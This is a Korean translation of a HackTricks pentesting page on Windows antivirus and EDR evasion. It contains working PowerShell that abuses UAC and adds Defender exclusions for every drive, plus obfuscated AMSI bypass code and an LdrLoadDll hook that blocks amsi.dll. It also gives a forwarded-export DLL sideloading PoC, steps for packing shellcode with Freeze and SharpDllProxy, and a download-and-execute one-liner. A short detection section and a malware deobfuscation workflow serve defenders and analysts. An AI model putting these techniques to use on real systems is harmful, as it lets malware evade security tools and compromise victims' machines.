# Antivirus (AV) 우회

{{#include ../banners/hacktricks-training.md}}

**이 페이지는** [**@m2rc_p**](https://twitter.com/m2rc_p)**님이 작성했습니다!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender의 동작을 중지시키는 도구.
- [no-defender](https://github.com/es3n1n/no-defender): 다른 AV를 가장해 Windows Defender의 동작을 중지시키는 도구.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Installer-style UAC bait before tampering with Defender

게임 치트로 가장한 공개 로더는 종종 서명되지 않은 Node.js/Nexe 설치 프로그램으로 배포되며, 먼저 **사용자에게 권한 상승을 요청**하고 그 다음에 Defender를 무력화합니다. 흐름은 간단합니다:

1. `net session`으로 관리자 컨텍스트를 검사합니다. 이 명령은 호출자가 admin 권한을 가지고 있을 때만 성공하므로 실패하면 로더가 일반 사용자로 실행 중임을 의미합니다.
2. 원래 명령줄을 유지한 채 예상되는 UAC 동의 프롬프트를 트리거하기 위해 즉시 `RunAs` verb로 자신을 재실행합니다.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
피해자들은 이미 “cracked” 소프트웨어를 설치하고 있다고 믿기 때문에, 프롬프트는 보통 수락되어 악성코드가 Defender의 정책을 변경하는 데 필요한 권한을 얻게 된다.

### 모든 드라이브 문자에 대한 포괄적 `MpPreference` 제외

권한이 상승하면, GachiLoader-style chains는 서비스를 완전히 비활성화하는 대신 Defender의 사각지대를 극대화한다. 로더는 먼저 GUI watchdog (`taskkill /F /IM SecHealthUI.exe`)를 종료한 다음, 모든 사용자 프로필, 시스템 디렉터리 및 이동식 디스크가 검사 대상에서 제외되도록 **매우 광범위한 제외**를 적용한다:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- 루프는 모든 마운트된 파일 시스템(D:\, E:\, USB sticks 등)을 훑기 때문에 **any future payload dropped anywhere on disk is ignored**.
- `.sys` 확장자 제외 설정은 미래 지향적이다 — 공격자는 이후에 Defender를 다시 건드리지 않고 unsigned drivers를 로드할 선택지를 남겨둔다.
- 모든 변경은 `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` 아래에 기록되므로, 이후 단계에서 제외 항목이 유지되는지 확인하거나 UAC를 다시 트리거하지 않고 확장할 수 있다.

Defender 서비스가 중지되지 않기 때문에, 단순한 상태 검사들은 “antivirus active”로 계속 보고하지만 실제 실시간 검사에서는 해당 경로들을 전혀 건드리지 않는다.

## **AV Evasion Methodology**

현재 AV들은 파일이 악성인지 판별하기 위해 정적 탐지(static detection), 동적 분석(dynamic analysis), 더 고급 EDR의 경우 행동 분석(behavioural analysis) 등 다양한 방법을 사용한다.

### **Static detection**

정적 탐지는 바이너리나 스크립트 내의 알려진 악성 문자열이나 바이트 배열을 플래그하거나, 파일 자체에서 정보를 추출(예: file description, company name, digital signatures, icon, checksum 등)함으로써 이루어진다. 이는 알려진 공개 도구를 사용하면 더 쉽게 적발될 수 있음을 의미한다. 이를 우회하는 방법은 몇 가지가 있다:

- **Encryption**

바이너리를 암호화하면 AV가 프로그램을 감지할 방법이 없어지지만, 메모리에서 복호화하여 실행할 로더가 필요하다.

- **Obfuscation**

때로는 바이너리나 스크립트의 일부 문자열을 변경하는 것만으로 AV를 피할 수 있지만, 무엇을 난독화하려는지에 따라 시간이 많이 걸릴 수 있다.

- **Custom tooling**

자체 도구를 개발하면 알려진 악성 시그니처가 없겠지만, 많은 시간과 노력이 필요하다.

> [!TIP]
> Windows Defender의 정적 탐지에 대해 확인하는 좋은 방법은 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)이다. 이 도구는 파일을 여러 세그먼트로 분할한 다음 각 세그먼트에 대해 Defender에게 개별적으로 스캔을 수행하도록 하여, 바이너리에서 어떤 문자열이나 바이트가 플래그되는지 정확히 알려줄 수 있다.

실전 AV 회피에 관한 이 [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)를 강력히 추천한다.

### **Dynamic analysis**

동적 분석은 AV가 바이너리를 샌드박스에서 실행하고 악성 행위를 관찰하는 것이다(예: 브라우저 비밀번호를 복호화·읽으려 시도, LSASS에 대해 minidump 수행 등). 이 부분은 다루기 까다로울 수 있지만, 샌드박스를 회피하기 위해 시도해볼 수 있는 몇 가지 방법은 다음과 같다.

- **Sleep before execution** 구현 방식에 따라 AV의 동적 분석을 우회하는 훌륭한 방법이 될 수 있다. AV는 사용자의 작업 흐름을 방해하지 않기 위해 파일을 스캔할 때 시간이 매우 짧으므로, 긴 sleep을 사용하면 바이너리 분석을 방해할 수 있다. 문제는 많은 AV 샌드박스가 구현 방식에 따라 해당 sleep을 건너뛸 수 있다는 점이다.
- **Checking machine's resources** 일반적으로 샌드박스는 작업에 사용할 수 있는 자원이 매우 적다(예: < 2GB RAM). 그렇지 않으면 사용자의 머신이 느려질 수 있다. 여기서 매우 창의적으로 접근할 수 있다. 예를 들어 CPU 온도나 팬 속도를 확인하는 등 샌드박스에 모든 것이 구현되어 있지는 않다.
- **Machine-specific checks** 대상 사용자의 워크스테이션이 "contoso.local" 도메인에 가입되어 있다면, 컴퓨터의 도메인을 확인하여 지정한 도메인과 일치하지 않으면 프로그램을 종료하도록 할 수 있다.

실제로 Microsoft Defender의 샌드박스 컴퓨터 이름은 HAL9TH이므로, 악성코드를 실행하기 전에 컴퓨터 이름을 확인하면, 이름이 HAL9TH인 경우 Defender 샌드박스 내부에 있다는 것을 알 수 있으므로 프로그램을 종료하도록 할 수 있다.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

샌드박스를 상대로 할 때 [@mgeeky](https://twitter.com/mariuszbit)의 몇 가지 좋은 팁들

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

앞서 말했듯이, **public tools**는 결국 **검출될 것**이므로, 스스로에게 물어봐야 한다:

예를 들어 LSASS를 덤프하고 싶다면, **do you really need to use mimikatz**? 아니면 덜 알려져 있지만 LSASS를 덤프할 수 있는 다른 프로젝트를 사용할 수 있지 않을까?

정답은 후자일 가능성이 크다. mimikatz는 아마도 AV와 EDR에서 가장 많이 플래그되는 도구 중 하나일 것이고, 프로젝트 자체는 훌륭하지만 AV를 회피하려고 다루기에는 악몽일 수 있으므로, 하려는 작업에 대한 대안을 찾아라.

> [!TIP]
> 페이로드를 회피용으로 수정할 때는 Defender에서 자동 샘플 제출(automatic sample submission)을 꼭 끄고, 장기적인 회피가 목적이라면 제발, **DO NOT UPLOAD TO VIRUSTOTAL**. 특정 AV에서 페이로드가 탐지되는지 확인하고 싶다면 VM에 해당 AV를 설치하고 자동 샘플 제출을 끄려 시도한 다음, 결과에 만족할 때까지 그곳에서 테스트하라.

## EXEs vs DLLs

가능할 때마다 회피를 위해 항상 **DLLs 사용을 우선시하라**. 제 경험상 DLL 파일은 보통 **탐지율이 훨씬 낮고** 분석 대상이 되는 경우가 적어, 페이로드가 DLL로 실행될 수 있는 경우 이를 활용하는 것은 탐지를 피하기 위한 매우 간단한 트릭이다.

다음 이미지에서 볼 수 있듯이, Havoc의 DLL Payload는 antiscan.me에서 4/26의 탐지율을 보인 반면, EXE 페이로드는 7/26의 탐지율을 보였다.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

이제 DLL 파일로 훨씬 더 은밀하게 행동할 수 있는 몇 가지 트릭을 보여주겠다.

## DLL Sideloading & Proxying

**DLL Sideloading**은 로더의 DLL 검색 순서를 이용하여 피해자 애플리케이션과 악성 payload(s)를 서로 나란히 배치하는 기법이다.

프로그램들이 DLL Sideloading에 취약한지 확인하려면 [Siofra](https://github.com/Cybereason/siofra)와 다음 powershell 스크립트를 사용할 수 있다:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
이 명령은 "C:\Program Files\\" 내부에서 DLL hijacking에 취약한 프로그램 목록과 해당 프로그램들이 로드하려는 DLL 파일들을 출력합니다.

저는 **explore DLL Hijackable/Sideloadable programs yourself**를 강력히 권합니다. 이 기법은 제대로 하면 꽤 은밀하지만, 공개적으로 알려진 DLL Sideloadable programs을 사용하면 쉽게 발각될 수 있습니다.

프로그램이 로드할 것으로 기대하는 이름의 악성 DLL을 단순히 배치하는 것만으로는 페이로드가 실행되지 않습니다. 프로그램은 해당 DLL 안에 특정 함수들을 기대하기 때문입니다. 이 문제를 해결하기 위해 우리는 **DLL Proxying/Forwarding**이라는 다른 기법을 사용할 것입니다.

**DLL Proxying**은 프록시(악성) DLL에서 원래 DLL로 프로그램이 호출하는 함수를 전달하여 프로그램의 기능을 유지하면서 페이로드 실행을 처리할 수 있게 합니다.

저는 [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) 프로젝트와 [@flangvik](https://twitter.com/Flangvik/)의 코드를 사용할 것입니다.

다음은 제가 따랐던 단계들입니다:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
마지막 명령은 우리에게 2개의 파일을 제공합니다: DLL 소스 코드 템플릿과 원래 이름이 바뀐 DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! I would call that a success.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> I **highly recommend** you watch [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) about DLL Sideloading and also [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) to learn more about what we've discussed more in-depth.

### Forwarded Exports 악용 (ForwardSideLoading)

Windows PE 모듈은 실제로 "forwarders"인 함수를 export할 수 있습니다: 코드 대신 export 엔트리는 `TargetDll.TargetFunc` 형식의 ASCII 문자열을 포함합니다. 호출자가 export를 resolve하면, Windows 로더는 다음을 수행합니다:

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

이해해야 할 주요 동작:
- If `TargetDll` is a KnownDLL, it is supplied from the protected KnownDLLs namespace (e.g., ntdll, kernelbase, ole32).
- If `TargetDll` is not a KnownDLL, the normal DLL search order is used, which includes the directory of the module that is doing the forward resolution.

이로 인해 간접적인 sideloading primitive가 가능해집니다: 함수가 non-KnownDLL 모듈 이름으로 forward된 signed DLL을 찾아서, 그 signed DLL과 같은 디렉터리에 forward된 타깃 모듈 이름과 정확히 동일한 이름의 공격자 제어 DLL을 함께 배치하면 됩니다. forwarded export가 호출되면, 로더는 forward를 해석하고 동일한 디렉터리에서 당신의 DLL을 로드하여 DllMain을 실행합니다.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll`은 KnownDLL이 아니므로 정상적인 검색 순서에 따라 로드됩니다.

PoC (copy-paste):
1) 서명된 시스템 DLL을 쓰기 가능한 폴더로 복사
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 같은 폴더에 악성 `NCRYPTPROV.dll` 를 둡니다. 최소한의 DllMain만으로 code execution이 가능하며; DllMain을 트리거하기 위해 forwarded function을 구현할 필요는 없습니다.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 서명된 LOLBin으로 전달을 트리거:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
관찰된 동작:
- rundll32 (서명됨)가 side-by-side `keyiso.dll` (서명됨)을 로드함
- `KeyIsoSetAuditingInterface`를 해결하는 동안 로더가 포워드를 따라 `NCRYPTPROV.SetAuditingInterface`로 이동함
- 로더는 이후 `C:\test`에서 `NCRYPTPROV.dll`을 로드하고 해당 `DllMain`을 실행함
- 만약 `SetAuditingInterface`가 구현되어 있지 않으면, `DllMain`이 이미 실행된 후에야 "missing API" 오류가 발생함

Hunting tips:
- 대상 모듈이 KnownDLL이 아닌 forwarded exports에 집중하라. KnownDLLs는 `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`에 나열되어 있다.
- 다음과 같은 툴을 사용해 forwarded exports를 열거할 수 있다:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 후보를 찾으려면 Windows 11 forwarder inventory를 확인하세요: https://hexacorn.com/d/apis_fwd.txt

탐지/방어 아이디어:
- Monitor LOLBins (e.g., rundll32.exe)가 non-system paths에서 signed DLLs를 로드한 다음, 해당 디렉터리에서 동일한 베이스 이름을 가진 non-KnownDLLs를 로드하는 동작을 모니터링하세요
- 다음과 같은 프로세스/모듈 체인에 대해 경보를 발생시키세요: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` (사용자 쓰기 가능 경로 아래)
- 코드 무결성 정책(WDAC/AppLocker)을 적용하고 애플리케이션 디렉터리에서 write+execute를 차단하세요

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze는 payload toolkit으로, suspended processes, direct syscalls, alternative execution methods를 사용해 EDRs를 우회합니다`

Freeze를 사용하여 shellcode를 은밀하게 로드하고 실행할 수 있습니다.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 회피는 단순한 쫓고 쫓기는 게임입니다. 오늘 작동하는 것이 내일 탐지될 수 있으므로 한 가지 도구에만 의존하지 말고, 가능하면 여러 회피 기법을 연쇄적으로 사용해 보세요.

## AMSI (Anti-Malware Scan Interface)

AMSI는 "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"를 방지하기 위해 만들어졌습니다. 초기에는 AV가 디스크상의 파일만 스캔할 수 있었기 때문에, 페이로드를 메모리에서 직접 실행할 수 있다면 AV는 이를 막을 수 있는 가시성이 부족했습니다.

AMSI 기능은 Windows의 다음 구성 요소들에 통합되어 있습니다.

- User Account Control, or UAC (EXE, COM, MSI, 또는 ActiveX 설치의 권한 상승)
- PowerShell (스크립트, 대화형 사용, 동적 코드 평가)
- Windows Script Host (wscript.exe 및 cscript.exe)
- JavaScript 및 VBScript
- Office VBA 매크로

이는 안티바이러스 솔루션이 스크립트 내용을 암호화되거나 난독화되지 않은 형태로 노출하여 스크립트 동작을 검사할 수 있게 합니다.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`를 실행하면 Windows Defender에서 다음과 같은 경고가 발생합니다.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

스크립트가 실행된 실행 파일의 경로 앞에 `amsi:`를 붙이는 것을 확인할 수 있습니다. 이 경우에는 powershell.exe입니다.

디스크에 파일을 떨어뜨리지 않았음에도 AMSI 때문에 인메모리 상태에서 탐지되었습니다.

더욱이, **.NET 4.8**부터는 C# 코드도 AMSI를 통해 실행됩니다. 이것은 `Assembly.Load(byte[])`를 통한 인메모리 로드에도 영향을 미칩니다. 따라서 AMSI를 회피하려면 인메모리 실행 시 낮은 버전의 .NET(예: 4.7.2 이하)을 사용하는 것이 권장됩니다.

AMSI를 우회하는 방법에는 몇 가지가 있습니다:

- **Obfuscation**

AMSI는 주로 정적 탐지로 작동하므로 로드하려는 스크립트를 수정하는 것이 탐지를 회피하는 좋은 방법이 될 수 있습니다.

그러나 AMSI는 여러 레이어로 난독화된 스크립트도 복원할 수 있는 기능을 가지고 있어, 난독화는 어떻게 하는지에 따라 좋지 않은 선택이 될 수 있습니다. 따라서 회피가 그리 간단하지 않을 수 있습니다. 다만 때로는 변수 이름 몇 개만 바꾸어도 충분한 경우가 있어, 얼마나 심각하게 플래그가 붙었는지에 따라 달라집니다.

- **AMSI Bypass**

AMSI는 DLL을 powershell 프로세스(또한 cscript.exe, wscript.exe 등)에 로드하는 방식으로 구현되어 있기 때문에, 권한이 없는 사용자로 실행 중일 때도 쉽게 변조할 수 있습니다. AMSI 구현의 이 결함 때문에 연구원들은 AMSI 스캔을 회피하는 여러 방법을 찾아냈습니다.

**Forcing an Error**

AMSI 초기화가 실패하도록 강제(amsiInitFailed)하면 현재 프로세스에 대해 스캔이 시작되지 않습니다. 원래 이는 [Matt Graeber](https://twitter.com/mattifestation)에 의해 공개되었고, Microsoft는 더 넓은 사용을 방지하기 위해 시그니처를 개발했습니다.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
현재 powershell 프로세스에서 AMSI를 무용지물로 만드는 데 필요한 것은 powershell 코드 한 줄뿐이었다. 이 한 줄은 물론 AMSI 자체에 의해 탐지되었기 때문에, 이 기법을 사용하려면 약간의 수정이 필요하다.

다음은 내가 이 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)에서 가져온 수정된 AMSI bypass다.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

이 기법은 처음 [@RastaMouse](https://twitter.com/_RastaMouse/)에 의해 발견되었으며, amsi.dll의 "AmsiScanBuffer" 함수 주소를 찾아 사용자 입력을 스캔하는 해당 함수를 E_INVALIDARG 코드를 반환하도록 덮어쓰는 것을 포함합니다. 이렇게 하면 실제 스캔 결과는 0을 반환하게 되고, 이는 클린으로 해석됩니다.

> [!TIP]
> 자세한 설명은 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)를 참조하세요.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### amsi.dll 로드 방지로 AMSI 차단 (LdrLoadDll hook)

AMSI는 현재 프로세스에 `amsi.dll`이 로드된 이후에만 초기화됩니다. 언어에 구애받지 않는 견고한 우회 방법은 요청된 모듈이 `amsi.dll`일 때 오류를 반환하도록 `ntdll!LdrLoadDll`에 유저 모드 후크를 설치하는 것입니다. 그 결과 AMSI는 로드되지 않으며 해당 프로세스에서는 스캔이 수행되지 않습니다.

구현 개요 (x64 C/C++ 의사코드):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- PowerShell, WScript/CScript 및 커스텀 로더 등 AMSI를 로드하는 모든 환경에서 동작합니다 (anything that would otherwise load AMSI).
- 긴 커맨드라인 아티팩트를 피하기 위해 stdin을 통해 스크립트를 전달하는 방식(`PowerShell.exe -NoProfile -NonInteractive -Command -`)과 함께 사용하세요.
- LOLBins를 통해 실행되는 로더에서 사용되는 것이 관찰되었습니다 (예: `regsvr32`가 `DllRegisterServer` 호출).

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**감지된 시그니처 제거**

현재 프로세스의 메모리에서 감지된 AMSI 시그니처를 제거하려면 **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** 또는 **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** 같은 도구를 사용할 수 있습니다. 이 도구는 현재 프로세스의 메모리를 스캔하여 AMSI 시그니처를 찾은 다음 NOP instructions로 덮어써 메모리에서 사실상 제거합니다.

**AMSI를 사용하는 AV/EDR 제품들**

AMSI를 사용하는 AV/EDR 제품 목록은 **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**에서 찾을 수 있습니다.

**PowerShell 버전 2 사용**

PowerShell 버전 2를 사용하면 AMSI가 로드되지 않으므로 AMSI로 스캔되지 않고 스크립트를 실행할 수 있습니다. 다음과 같이 실행할 수 있습니다:
```bash
powershell.exe -version 2
```
## PowerShell 로깅

PowerShell logging은 시스템에서 실행된 모든 PowerShell 명령을 기록할 수 있는 기능입니다. 감사(auditing)와 문제해결에 유용하지만, 탐지를 회피하려는 공격자에게는 큰 장애가 될 수 있습니다.

PowerShell 로깅을 우회하려면 다음 기법들을 사용할 수 있습니다:

- **Disable PowerShell Transcription and Module Logging**: 이 목적을 위해 [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) 같은 도구를 사용할 수 있습니다.
- **Use PowerShell version 2**: PowerShell version 2를 사용하면 AMSI가 로드되지 않으므로 AMSI 검사 없이 스크립트를 실행할 수 있습니다. 다음처럼 실행하세요: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) 를 사용해 방어 기능이 없는 powershell을 생성하세요 (이것이 Cobal Strike의 `powerpick`이 사용하는 방식입니다).


## 난독화

> [!TIP]
> 여러 난독화 기법은 데이터를 암호화하는 데 의존하는데, 이는 바이너리의 엔트로피를 증가시켜 AVs 및 EDRs가 이를 탐지하기 쉽게 만듭니다. 이 점을 주의하고, 민감하거나 숨겨야 할 코드 섹션에만 선택적으로 암호화를 적용하는 것이 좋습니다.

### ConfuserEx로 보호된 .NET 바이너리 디오버퍼케이션

ConfuserEx 2(또는 상업적 포크)를 사용하는 악성코드를 분석할 때는 디컴파일러와 샌드박스를 차단하는 여러 보호 계층에 마주치는 것이 일반적입니다. 아래 워크플로우는 나중에 dnSpy나 ILSpy 같은 도구로 C#으로 디컴파일할 수 있는 거의 원본에 가까운 IL을 안정적으로 복원합니다.

1.  안티탬퍼 제거 – ConfuserEx는 모든 *method body*를 암호화하고 *module* 정적 생성자 (`<Module>.cctor`) 안에서 복호화합니다. 또한 PE 체크섬을 패치하여 수정이 있을 경우 바이너리가 크래시하도록 합니다. 암호화된 메타데이터 테이블을 찾고 XOR 키를 복구한 뒤 깨끗한 어셈블리를 다시 작성하려면 **AntiTamperKiller**를 사용하세요:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
출력에는 언패커를 직접 만들 때 유용한 6개의 안티탬퍼 파라미터(`key0-key3`, `nameHash`, `internKey`)가 포함됩니다.

2.  심볼 / 제어 흐름 복구 – *clean* 파일을 ConfuserEx를 인식하는 de4dot 포크인 **de4dot-cex**에 입력하세요.
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 프로파일 선택  
• de4dot는 control-flow flattening을 되돌리고, 원래의 namespace, class 및 변수 이름을 복원하며 상수 문자열을 복호화합니다.

3.  프록시 호출 제거 – ConfuserEx는 디컴파일을 더 어렵게 하기 위해 직접적인 메서드 호출을 경량 래퍼(일명 *proxy calls*)로 교체합니다. 이를 제거하려면 **ProxyCall-Remover**를 사용하세요:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
이 단계 후에는 불투명한 래퍼 함수들(`Class8.smethod_10`, …) 대신 `Convert.FromBase64String` 또는 `AES.Create()` 같은 일반적인 .NET API가 보일 것입니다.

4.  수동 정리 – 결과 바이너리를 dnSpy로 열고 큰 Base64 블랍이나 `RijndaelManaged`/`TripleDESCryptoServiceProvider` 사용을 검색해 실제 페이로드를 찾으세요. 종종 악성코드는 이를 `<Module>.byte_0` 안에 초기화된 TLV 인코딩된 바이트 배열로 저장합니다.

위 체인은 악성 샘플을 실행할 필요 없이 실행 흐름을 복원하므로 오프라인 워크스테이션에서 작업할 때 유용합니다.

🛈  ConfuserEx는 `ConfusedByAttribute`라는 커스텀 어트리뷰트를 생성합니다. 이는 IOC로 사용되어 샘플을 자동으로 분류하는 데 활용할 수 있습니다.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 이 프로젝트의 목적은 [LLVM](http://www.llvm.org/) 컴파일 스위트의 오픈소스 포크를 제공하여 [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) 및 변조 방지를 통해 소프트웨어 보안을 향상시키는 것입니다.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator는 `C++11/14` 언어를 사용하여 외부 도구를 사용하거나 컴파일러를 수정하지 않고 컴파일 시점에 난독화된 코드를 생성하는 방법을 보여줍니다.
- [**obfy**](https://github.com/fritzone/obfy): C++ 템플릿 메타프로그래밍 프레임워크가 생성한 난독화된 연산 계층을 추가하여 애플리케이션을 크랙하려는 사람의 작업을 조금 더 어렵게 만듭니다.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz는 .exe, .dll, .sys 등을 포함한 다양한 PE 파일을 난독화할 수 있는 x64 바이너리 난독화기입니다.
- [**metame**](https://github.com/a0rtega/metame): Metame은 임의의 실행 파일을 위한 간단한 metamorphic code 엔진입니다.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator는 ROP(return-oriented programming)를 사용해 LLVM을 지원하는 언어를 위한 세분화된 code obfuscation 프레임워크입니다. ROPfuscator는 일반 명령을 ROP 체인으로 변환하여 어셈블리 코드 수준에서 프로그램을 난독화함으로써 정상적인 제어 흐름에 대한 우리의 일반적 인식을 방해합니다.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt는 Nim으로 작성된 .NET PE Crypter입니다.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor는 기존 EXE/DLL을 shellcode로 변환한 다음 이를 로드할 수 있습니다

## SmartScreen & MoTW

인터넷에서 일부 실행 파일을 다운로드해 실행할 때 이 화면을 본 적이 있을 것입니다.

Microsoft Defender SmartScreen은 잠재적으로 악성인 애플리케이션의 실행으로부터 최종 사용자를 보호하기 위한 보안 메커니즘입니다.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

